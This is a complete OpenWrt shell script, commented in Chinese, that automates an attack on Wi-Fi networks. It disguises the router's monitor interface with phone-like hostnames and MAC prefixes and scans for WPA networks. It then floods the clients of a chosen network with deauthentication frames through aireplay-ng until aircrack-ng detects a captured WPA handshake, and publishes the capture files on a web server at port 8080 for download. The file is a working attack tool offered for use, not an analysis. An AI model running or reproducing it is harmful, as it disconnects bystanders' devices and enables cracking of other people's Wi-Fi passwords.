#!/bin/sh
red='\e[91m'
green='\e[92m'
yellow='\e[1;33m'
magenta='\e[95m'
cyan='\e[96m'
none='\e[0m'

#修改攻击次数
ac_num=20

#定义警告界面
error() {

tmp_error="$(echo -e "${red}${detail}${none}")"
read -sp "${tmp_error}"
}
#定义通知界面
notifi() {

tmp_notifi="$(echo -e "${green}${detail}${none}")"
read -sp "${tmp_notifi}"
}
#MAC地址文本的函数
mac_addr() {
test ! -e /etc/config/scp && mkdir -p /etc/config/scp
cat > /etc/config/scp/mac.txt << "EOF"
vivo-S1@48:87:64
Galaxy-S10@60:f1:89
HUAWEI_Mate_9@30:74:96
Galaxy-S20@60:f1:89
vivo-X50-Pro@06:27:C0
HUAWEI_nova_3i@f8:c3:9e
vivo-Y7s@2C:FF:EE
Android-TV@f8:4f:ad
OPPO-Reno@C4:E3:9F
vivo-X50@82:41:C2
Homor_8@A4:CA:A0
iPhone@54:33:cb
nova_5_Pro@d4:62:ea
OPPO-Reno4-5G@B0:B5:C3
HUAWEI_nova@88:44:77
OPPO-Reno@44:AE:AB
iPhone-7@7C:50:49
HUAWEI-Mate-8@94:FE:22
iPhone@E4:B2:FB
Redmi-Note-5A@04:B1:67
honor-8X-Max@34:12:F9
HUAWEI-P10-Plus@70:8A:09
HUAWEI-9plus@0C:B5:27
HUAWEI-9plus@F8:C3:9E
xiaodu-home1C@88:DA:33
HUAWEI-P30@24:DA:33
HUAWEI-10Plus@D4:62:EA
HUAWEI-Mate-9@F0:C8:50
Honer-8C@68:A0:3E
HUAWEI-nova7-5G@42:EC:71
HUAWEI-Mate-20@B4:86:55
vivo-x21@28:31:66
HUAWEI-Mate-30@C2:79:49
HUAWEI-P30@14:3C:C3
HUAWEI-P20-Pro@F0:0F:EC
OPPO-A93-5G@9C:93:8F
OPPO-A93-5G@0C:93:8F
vivo-X30@20:31:1C
vivo-Y83@3C:A5:81
vivo-Y75A@70:47:E9
vivo_Y7s@F8:E7:A0
vivo_Y9s@3C:86:D1
HONOR-9X@54:92:09
vivo-Y5s@64:2C:0F
HUAWEI_P10@20:54:FA
OPPO_R11@94:D0:29
HUAWEI_P30_Pro@D4:62:EA
HUAWEI_nova_7_Pro_5G@F2:DD:0D
vivo_X30@BE:7B:92
iPhone-x@D8:8F:76
HUAWEI_nova_7_SE_5G@D6:27:26
iPhone-x@72:59:C9
OPPO_Reno3_Pro_5G@B4:A5:AC
HUAWEI_nova_5_Pro@AC:E3:42
iPhone-x@F6:75:25
nova_5_Pro@30:A2:C2
vivo-S1@9A:D9:8C
vivo-Y85@88:F7:BF
HUAWEI-nova-6-SE@BA:AE:D7
HUAWEI-nova-7-SE-5G@1A:25:79
HUAWEI-nova-7-SE-5G@62:BB:2A
HUAWEI-nova-2s@6C:B7:49
vivo-Y83@3C:A5:81
vivo-Y5s@64:2C:0F
HUAWEI-nova-5-Pro@44:D7:91
HUAWEI-P40@32:2A:7D
vivo-Z6@8E:13:A4
vivo-Y83A@20:F7:7C
EOF

}

mac_name() { 
    get_random_num=
    get_random_wei=                                                                                                                                                                                                                                                          
    test ! -e /etc/config/scp/mac.txt && echo -e "${red}没有找到mac地址列表${none}" && exit
    get_random_num=$(cat /etc/config/scp/mac.txt | wc -l)
    if [ "${get_random_num}" == "0" ]
    then
        echo "list is null , please check list !" && exit
    fi
    get_random_wei=$(echo ${get_random_num} | wc -L)
    if [ "${get_random_wei}" != "1" ]
    then
        num=1
        while true
        do
            test_a=
            test_a=$(head -n 5 /dev/urandom 2>/dev/null | tr -dc "0123456789"  2>/dev/null | head -c1)
            if [ "${test_a}" != "0" ] && [ "${test_a}" -le "${get_random_wei}" ]
            then
                random_max=
                random_max="${test_a}"
                break
            fi
            if [ "${num}" == "100" ]
            then
                exit
            fi
            let num=num+1
        done
    else
        random_max=1
    fi
    num=1
    while true
    do
        test_b=
        test_b=$(head -n 5 /dev/urandom 2>/dev/null | tr -dc "0123456789"  2>/dev/null | head -c${random_max})
        if [ "${test_b}" != "0" ] && [ "${test_b}" -le "${get_random_num}" ]
        then
            host_name=
            wlan_mac=
            host_name=$(sed -n "${test_b}p" /etc/config/scp/mac.txt | cut -d '@' -f 1 | sed -n "1p")                                                                                                                                                                                                       
            wlan_mac="$(sed -n "${test_b}p" /etc/config/scp/mac.txt | cut -d '@' -f 2)$(hexdump -n 3 -e '/1 ":%02x"' /dev/urandom)"
            if [ "${host_name}" != "" ] && [ "${wlan_mac}" != "" ] && [ "$(echo "${wlan_mac}" | wc -L)" == "17" ]
            then
                break
            fi
        fi
        if [ "${num}" == "100" ]
        then
            exit
        fi
        let num=num+1
    done
}

#get wifi_iface num
get_wifi_iface_num() {
    num=1
    test_num=0
    while [ "${num}" == "1" ]
    do
        if [ "${test_num}" != "30" ]
        then
            if [ "$(uci show | grep "wifinet${test_num}")" == "" ]
            then
                get_wifi_iface="${test_num}"
                num=0
            else
                let test_num=test_num+1
            fi
        else
            num=0
        fi
    done
}

#添加监听的热点
add_listen() {
    #删除系统默认生成的wifi热点
    if [ "$(uci show | grep "wireless.default_radio*")" != "" ]
    then
        uci del wireless.default_radio0
        if [ "${user_select}" == "2" ]
        then
            uci del wireless.default_radio1
        fi
        uci commit wireless
        echo ""
        echo -e "${yellow}成功删除系统默认生成的wifi热点${none}"
    fi
    user_select="$1"
    echo -e "你选择了 ${user_select}"
    [ -z ${user_select} ] && return 1
    if [ "${user_select}" == "2" ]
    then
        test_drever=$(uci show | grep 2g | cut -d '.' -f 2)
        if [ "$(echo ${test_drever} | grep 'radio')" != "" ]
        then
            drever=${test_drever}
        else
            echo -e "${red}当前系统不是openwrt系统! ${none} -----> 111" && exit
        fi
    elif [ "${user_select}" == "5" ]
    then
        test_drever=$(uci show | grep 5g | cut -d '.' -f 2 | sed -n "1p")
        if [ "$(echo ${test_drever} | grep 'radio')" != "" ]
        then
            drever=${test_drever}
            # test_name="_5G"
        else
            echo -e "${red}当前系统不是openwrt系统! ${none} -----> 222" && exit
        fi
    elif [ "${user_select}" == "6" ]
    then
        test_drever=$(uci show | grep 5g | cut -d '.' -f 2 | sed -n "1p")
        if [ "$(echo ${test_drever} | grep 'radio')" != "" ]
        then
            drever=${test_drever}
            # test_name="_5G"
        else
            echo -e "${red}当前系统不是openwrt系统! ${none} -----> 111" && exit
        fi
    elif [ "${user_select}" == "4" ]
    then
        drever="radio0"
    fi
    if [ "$(uci show | grep  "wireless.${drever}.country=\'TW\'")" == "" ]
    then
        uci set wireless.${drever}.country='TW'
    fi
    mac_name
    sys_release=$(cat /etc/openwrt_release | grep 'DISTRIB_RELEASE' | cut -d '.' -f 1 | cut -d "'" -f 2)
    if [ "${sys_release}" == "18" ]
    then
        class_name="$(uci add wireless wifi-iface)"
    else
        get_wifi_iface_num
        class_name="wifinet${get_wifi_iface}"
    fi
    uci set wireless.${class_name}=wifi-iface
    uci set wireless.${class_name}.device="${drever}"
    uci set wireless.${class_name}.mode='monitor'
    uci set wireless.${class_name}.ssid="${host_name}${test_name}"
    uci set wireless.${class_name}.network='lan'
    # uci set wireless.${class_name}.disable='1'
    uci set wireless.${class_name}.macaddr="${wlan_mac}"
    uci commit wireless
    # uci delete wireless.${class_name}.disable='1'
    # uci commit wireless
    wifi reload > /dev/null

    if [ "$(uci show | grep "${host_name}")" != "" ] && [ "$(uci show | grep "${wlan_mac}")" != "" ]
    then
        echo ""                                                                                                                                                                                               
        echo -e "${yellow}监听热点创建完成 :${none}"
        echo -e "${yellow}监听热点名称: ${host_name}${none}"
        echo -e "${yellow}监听热点MAC: ${wlan_mac}${none}"
        echo ""
        uci set wireless.${drever}.disabled='0'
        uci commit wireless
        wifi reload > /dev/null
    else
        echo ""
        echo -e "${red}监听热点没有创建成功${none}"
        echo ""
        exit
    fi
}

#获取wifi相关的值
get_wifi() {
    echo ""
    echo -e "${yellow}正在扫描无线网络，请等待30秒……${none}"
    echo ""  
	test -e ./output*.csv && rm output*.csv
    test -e /tmp/output*.csv && rm /tmp/output*.csv
    test_bng=$(uci show | grep "${drever}.hwmode=" | cut -d "'" -f 2)
    if [ ! -z "$(iwinfo radio0 info | egrep "bgnac|nac")" ];then
        { airodump-ng -c 1-165 ${driver} -w /tmp/output -o csv; } &
        PID=$!

    elif [ "${test_bng}" == "11a" ];then
        { airodump-ng -c 36-165 ${driver} -w /tmp/output -o csv; } &
        PID=$!

    else
        { airodump-ng ${driver} -w /tmp/output -o csv; } &
        PID=$!

    fi

	sleep 30
	kill -TERM ${PID}
    sleep 2
    test -e /tmp/zb.txt && rm /tmp/zb.txt
	cat /tmp/output-01.csv | grep 'WPA' | cut -d ',' -f 1 > /tmp/BSSID.txt
	cat /tmp/output-01.csv | grep 'WPA' | cut -d ',' -f 4 > /tmp/Channel.txt
	cat /tmp/output-01.csv | grep 'WPA' | cut -d ',' -f 9 > /tmp/Power.txt
    cat /tmp/output-01.csv | grep 'WPA' | cut -d ',' -f 10 > /tmp/beacons.txt
    cat /tmp/output-01.csv | grep 'WPA' | cut -d ',' -f 11 > /tmp/date.txt
	cat /tmp/output-01.csv | grep 'WPA' | cut -d ',' -f 14 > /tmp/ESSID.txt
	sed -i "s/^\ //g;s/^$/uknow/g;s/ /\^\&/g" /tmp/ESSID.txt
    sed -i "s/ //g" /tmp/date.txt /tmp/beacons.txt /tmp/Channel.txt /tmp/Power.txt
	cat /tmp/output-01.csv | grep -v 'WPA' > /tmp/Station.txt
	num=1
	while true
	do
		BSSID="$(cat /tmp/BSSID.txt | sed -n "${num}p")"
		Channel="$(cat /tmp/Channel.txt | sed -n "${num}p")"
		Power="$(cat /tmp/Power.txt | sed -n ${num}p)"
        beacons="$(cat /tmp/beacons.txt | sed -n ${num}p)"
        date="$(cat /tmp/date.txt | sed -n ${num}p)"        
		ESSID="$(cat /tmp/ESSID.txt | sed -n ${num}p)"
		[ -z ${BSSID} ] && break
		if [ "$(cat /tmp/Station.txt | grep ${BSSID})" != "" ]
		then
			Station_tmp=$(cat /tmp/Station.txt | grep ${BSSID} | cut -d ',' -f 1 | sed -n '1p')
			echo -e "${num}\t${BSSID}  ${Channel}\t${Power}\t${beacons}\t${date}\t${ESSID}\t\t${Station_tmp}" >> /tmp/zb.txt
		else
			echo -e "${num}\t${BSSID}  ${Channel}\t${Power}\t${beacons}\t${date}\t${ESSID}" >> /tmp/zb.txt
		fi
		let num=num+1	
	done
	wifi_num=$(cat /tmp/BSSID.txt | wc -l)	
}

#删除监听热点
delet_ap() {
    del_ap=$(uci show | grep "${wlan_mac}" | cut -d '.' -f 1,2)
    [ -z ${del_ap} ] && echo -e "${red}没有检测到监听热点${none}"
    uci delete ${del_ap}
    if [ "$(uci show | grep "${wlan_mac}")" == "" ]
    then
        echo ""
        echo -e "${yellow}监听热点${host_name}删除完成${none}"
        echo ""
    else
        echo ""
        echo -e "${red}监听热点${host_name}没有删除完成，可以手动删除监听热点${none}"
        echo ""
    fi
    uci commit wireless
    wifi reload > /dev/null
}

#菜单
menu() {
	while true
	do
		test ! -e /tmp/zb.txt && echo -e "${red}没有找到zb.txt文档${none}" && return 1
		clear
		echo -e "${yellow}No.\tBSSID\t\t Channel Power\tBeacons\tDate\tESSID\t\tStation${none}"
		cat /tmp/zb.txt
        echo ""
		echo -en "\033[?25h${magenta}请选择要抓包WiFi的序列号【1-${wifi_num}】，重新扫描【s】，退出【q】\n请按提示输入：${none}"
		read select_num
        [ -z "${select_num}" ] && continue
		if [ "${select_num}" == "s" ]
		then
			get_wifi
			continue
		elif [ "${select_num}" == "q" ]
		then
            delet_ap
            disabled_wifi
            clean_kill
			exit
		elif [[ "${select_num}" -gt "${wifi_num}" || "${select_num}" -lt "0" ]]
		then
			echo ""
			read -sp "输入的数值超出范围，请按照提示的范围输入序列号"
			continue
		fi
		Bsid="$(cat /tmp/zb.txt | sed -n "${select_num}p" | awk '{print $2}')"
        Chanel="$(cat /tmp/zb.txt | sed -n "${select_num}p" | awk '{print $3}')"
		Esid="$(cat /tmp/zb.txt | sed -n ${select_num}p | awk '{print $7}')"
		Station="$(cat /tmp/zb.txt | sed -n ${select_num}p | awk '{print $8}')"
		[ -z ${Bsid} ] && continue
        echo ""
        echo -e "已选择【${Esid}】"
        sleep 1
		break
	done	
}


#检测监听热点删除监听热点
check_monitor() {
    while true
    do
        monitor_name="$(uci show | grep 'monitor' | cut -d '.' -f 1,2)"
        if [ -z "${monitor_name}" ]
        then
            echo ""
            echo -en "${yellow}监听热点清理完成。${none}"
            echo ""
            return 0
        fi
        for i in ${monitor_name}
        do
            uci delete $i
        done
        uci commit wireless
        wifi reload > /dev/null
    done
    sleep 1
}

#检测抓到的握手包信息
check_handshake() {
    num_while=1
    while true
    do
        if [[ -f /tmp/cap/tmp_1-01.cap ]];then
            { aircrack-ng /tmp/cap/tmp_1-01.cap > /tmp/packe_if.log; } &
            AIR_PID=$!
            sleep 4
            [ ! -z ${AIR_PID} ] && kill -9 ${AIR_PID} &>/dev/null
            [ "$(cat /tmp/packe_if.log | grep -a 'Killedg packets')" != "" ] && let num_while+=1

            if [ "${num_while}" == "20" ]
            then
                killall -2 airodump-ng &>/dev/null
                rm -rf /tmp/cap/tmp_1-01*
                airod_pack&
                air_pid=$!
                [ ! -z ${air_pid} ] && kill -2 ${air_pid}
                # [ ! -z ${ZPID} ] && kill -STOP ${ZPID}
                # sleep 4
                # { aircrack-ng /tmp/cap/tmp_1-01.cap > /tmp/packe_if.log; } &
                # AIR_PID=$!
                # sleep 2
                # [ ! -z ${ZPID} ] && kill -CONT ${ZPID}
                num_while=1
            fi
        fi
    done
}

#抓包
airod_pack() {
    airodump-ng --bssid ${Bsid} -w /tmp/cap/tmp_1 -c ${Chanel} ${driver} &  
    ZPID=$!
}

#清理和终止程序
clean_kill() {
    [ ! -z ${ZPID} ] && kill -TERM ${ZPID} &>/dev/null
    [ ! -z ${CPID} ] && kill -TERM ${CPID} &>/dev/null
    [ ! -z ${CHSK} ] && kill -TERM ${CHSK} &>/dev/null
    [ ! -z ${air_pid} ] && kill -TERM ${air_pid} &>/dev/null  
    killall -9 airodump-ng &>/dev/null
    killall -9 aircrack-ng &>/dev/null
    killall -9 aireplay-ng &>/dev/null
    rm -rf /tmp/cap/tmp_1-01*
}

#清理内存
clean_mem() {
    echo 1 > /proc/sys/vm/drop_caches
    echo 2 > /proc/sys/vm/drop_caches
    echo 3 > /proc/sys/vm/drop_caches
}

#攻击
accuse_wifi() {
    [ ! -e /tmp/cap ] && mkdir -p /tmp/cap
    [ ! -L /cap/cap ] && ln -s /tmp/cap /cap
    test -e /tmp/packe_if.log && rm -rf /tmp/packe_if.log
    echo 1 /proc/sys/vm/drop_caches &>/dev/null
    test -e /tmp/air_tmp.log && rm /tmp/air_tmp.log
    echo -e "${Bsid}\n${Esid}\n${Chanel}\n${driver}\n${Station}" > /tmp/running.txt
    echo -e "\n${yellow}可按任意键退出抓包程序${none}"
    echo ""
    sleep 2
    airod_pack&
    air_pid=$!
    if [[ "$(echo "${Esid}" | sed 's/[-,0-9,a-z,A-Z,_,@]//g')" != "" ]]
    then
        Bsid_tmp=$(echo ${Bsid} | sed 's/:/-/g')
        Esid=${Bsid_tmp}
    fi
    crack&
    CPID=$!
    check_handshake&
    CHSK=$!
    num_ll=0
    while true
    do
        
        if [[ -f /tmp/packe_if.log && "$(cat /tmp/packe_if.log 2>/dev/null | grep -a "1 handshake")" != "" ]]
        then
            test -e /tmp/cap/tmp_1-01.cap && mv /tmp/cap/tmp_1-01.cap /tmp/cap/"${Esid}".cap
            clean_kill
            clear
            echo -e "\n\n${yellow}* * *已经抓到${Esid}握手包* * *${none}\n" && test -e /tmp/running.txt && rm /tmp/running.txt
            echo ""
            echo -e "\n${yellow}抓到的握手包在这个网址中，请单击下面的网址导出握手包\n
            http://${ip_address}:8080${none}/cap/${Esid}.cap\n"
            detail="回车后继续抓包" && notifi
            clean_mem
            break
        fi
        read -t 1 -n 1 selct_q 
        if [ "$?" == "0" ]
        then
            [ "${selct_q}" == "d" ] && rm -rf /tmp/cap/*
            echo -e "\n${yellow}正在退出抓包. . .${none}\n"
            clean_kill
            clean_mem
            break
        fi
    done
    
}


# 掉线攻击
crack(){
    STOP=true
    client_mac=
    count=0
    while true
    do
	if [ $count -ge 4 ];then
	    break	
	fi
        test ! -e /tmp/running.txt && sleep 3 && let count++ && continue

        Bsid="$(cat /tmp/running.txt | sed -n "1p")"
        Esid="$(cat /tmp/running.txt | sed -n "2p")"
        Chanel="$(cat /tmp/running.txt | sed -n "3p")"
        driver="$(cat /tmp/running.txt | sed -n "4p")"
        Station="$(cat /tmp/running.txt | sed -n "5p")"
        if [[ "${Bsid}" == "" || "${Esid}" == "" || "${driver}" == "" ]]
        then

            continue
        fi
        if [[ -e /tmp/cap/tmp_1-01.csv ]]
        then
            tmp_client_mac="$(cat /tmp/cap/tmp_1-01.csv | grep ${Bsid} | grep -v CCMP | cut -d ',' -f 1)"
            if [[ ! -z "${tmp_client_mac}" ]]
            then
                client_mac="${tmp_client_mac}"
            else
                [ ! -z "${Station}" ] && client_mac=${Station} || client_mac=
            fi
        else
            [ ! -z "${Station}" ] && client_mac=${Station} || client_mac=

        fi
        sleep 1

        for i in ${client_mac}
        do
            if [[ -e /tmp/cap/tmp_1-01.cap ]]
            then
                if [[ -f /tmp/packe_if.log && "$(cat /tmp/packe_if.log | grep -a "1 handshake")" != "" ]]
                then           
                    sleep 2
		            STOP=false
                    break
                   
                fi

                aireplay-ng -0 ${ac_num} -a ${Bsid} -c ${i} ${driver} --ignore-negative-one &>/dev/nul
                killall aireplay-ng &>/dev/null
                sleep 20
            else
                break
            fi
            sleep 1
        done
        clean_mem
        sleep 1
    done 
}

#显示信息
echo_info() {
    clear
    echo ""
    echo -e "${red}检测内存不足，请把握手包导出来，避免路由器死机丢失抓到的握手包${done}"
    echo ""
    echo -e "${yellow}抓到的握手包在下面的网址中，请单击下面的网址导出抓到的握手包,\
\n  握手包导出来后， 输入【d】后脚本会清理抓到的握手包
    \n\n\thttp://${ip_address}:8080${none}/cap${none}"

}
#监控内存大小
listen_men() {
    
    while true
    do
        #检测内存剩余大小
        tmp_men_free="$(cat /proc/meminfo | grep MemFree | awk '{print $2}')"
        let men_free=tmp_men_free/1024
        if [ ${men_free} -le 10 ];then
            clear
            clean_kill
            clean_mem
            echo_info
        fi
    done
}

#关闭网卡无线功能
disabled_wifi() {
user_select=$(uci show | grep wireless.radio[0,1]=wifi | wc -l)
if [ "${user_select}" == "1" ]
then
    driver=radio0
elif [ "${user_select}" == "2" ]
then
    driver="radio0 radio1"
fi
num=1
for i in ${driver}
do
    uci set wireless.${i}.disabled='1'
    uci commit wireless
    wifi reload > /dev/null
    if [ "$(uci get wireless.${i}.disabled)" != "1" ]
    then

        let num=num+1
        if [ "${num}" == "5" ]
        then
            break
        fi
        continue
    fi
done
}

#nginx配置
nginx_config() {
    if [ ! -f /etc/nginx/conf.d/autoindex.conf ];then
        [ ! -e /etc/nginx/conf.d ] && mkdir -p /etc/nginx/conf.d
        [ ! -e /cap ] && mkdir /cap
cat > /etc/nginx/conf.d/autoindex.conf << EOF
server {
    listen 8080;
    server_name  localhost;
    root /cap;
    autoindex on;
}
EOF
        /etc/init.d/nginx restart    
    fi
}

#uhttpd配置文件
uhttpd_config() {
    if [ "$(cat /etc/config/uhttpd | grep "uhttpd 'cap'")" == "" ];then
        [ ! -e /cap ] && mkdir /cap
echo "
config uhttpd 'cap'                                           
list listen_http        0.0.0.0:8080                                 
option home             '/cap'" >> /etc/config/uhttpd
        /etc/init.d/uhttpd restart
    fi
}

# #检测系统是否有抓包工具
# if [[ "$(opkg list | grep -a aircrack-ng)" == "" ]]
# then
#     echo -e "${red}系统中没有检测到有抓包工具“aircrack-ng”，安装抓包工具才可以执行脚本${none}" && exit
# fi


#挂载设置
mount_nfs() {
    client_ip=$(export | grep 'SSH_CLIENT' | cut -d "'" -f 2 | awk '{print $1}')
    [ -z ${client_ip} ] && echo -e "${red}没有检测到客户端登录的IP地址${none}" && exit
    if [ "$(mount -l | grep ${client_ip})" != "" ]
    then
        return
    fi
    while true
    do
        clear
        echo ""
        echo -en "${magenta}请输入挂载的盘符和对应的目录，如：【a/seek】【按q退出】：${none}"
        read disk_path
        [[ "${disk_path}" == "q" ]] && exit
        [ -z "${disk_path}" ] && read -sp "输入为空，请重新输入" && continue
        mount -t nfs ${client_ip}:/${disk_path} /mnt -o nolock
        if [ "$?" != "0" ]
        then
            echo ""
            read -sp "磁盘没有挂载成功，请重新输入磁盘"
        else
            break
        fi
    done
}

#检测抓包所需软件
check_soft() {

    if [ ! -f /usr/bin/aircrack-ng ];then
        echo -e "\n${red}系统中没有找到抓包工具，请安装抓包工具“aircrack-ng”工具然后执行抓包脚本。${none}\n"
        exit
    fi

}

#找无线驱动名称
check_wirles() {
    bc_num=1
    while true
    do
        echo -e "\n${yellow}正在等待配置生效，请等待5秒. . .${none}\n"
        sleep 5
        test_mac=$(echo ${wlan_mac} | sed "s/:/-/g" | tr '[a-z]' '[A-Z]')
        driver=$(ifconfig | grep -i "${test_mac}" | awk '{print $1}')
        let bc_num+=1
        if [ ${bc_num} == 10 ] && [ -z ${driver} ];then
            read -sp "没有获取到无线驱动名称" && exit
        fi
        [ ! -z ${driver} ] && break
        echo -e "\n${red}没有获取到无线驱动名称,正在重新尝试. . .${none}\n"
    done
}

check_soft
clean_kill
check_monitor
clean_mem
# mount_nfs
test ! -e /etc/config/scp/mac.txt && mac_addr
user_select=$(uci show | grep wireless.radio[0,1,2]=wifi | wc -l)
if [[ -z ${user_select} ]];then
    echo ""
    echo -e "\e[1;31m请检查是否是openwrt系统\e[0m" && exit
    echo ""
fi
if [ "${user_select}" == "1" ]
then
    add_listen 4
    echo -e "\n${yellow}正在等待配置生效. . .${none}\n"
    sleep 5
    check_wirles
elif [ "$(echo ${user_select} | grep [23])" != "" ]
then
    while true
    do
        clear
        echo -e "\n${yellow}选择抓包的频段${none}"
        echo ""
        echo -e "${yellow}1、抓取2.4G频段的包${none}"
        echo ""
        echo -e "${yellow}2、抓取5G频段的包${none}"
        echo ""
        [[ "${user_select}" == "3" ]] && echo -e "${yellow}3、抓取另一个5G频段的包${none}\n"
        echo -en "\033[?25h${magenta}请选择输入序列号【按q退出】：${none}"
        read select_packe
        [[ "${select_packe}" == "q" ]] && exit
        if [ "${select_packe}" == "1" ]
        then
            add_listen 2
            check_wirles
        elif [ "${select_packe}" == "2" ]
        then
            add_listen 5
            check_wirles
        elif [ "${select_packe}" == "3" ]
        then
            add_listen 6
            check_wirles
        else
            read -sp "请按照提示输入"
            continue
        fi
        break
    done
fi

#获取ip地址
ip_address="$(uci get network.lan.ipaddr)"

listen_men&

#判断路由器的网页服务器类型
if [ -e /etc/nginx ];then
    nginx_config
elif [ -f /etc/config/uhttpd ];then
    uhttpd_config
else
    detail="没有找到网页服务器" && error
fi

get_wifi

while true
do
    menu
    accuse_wifi
    clean_mem
done
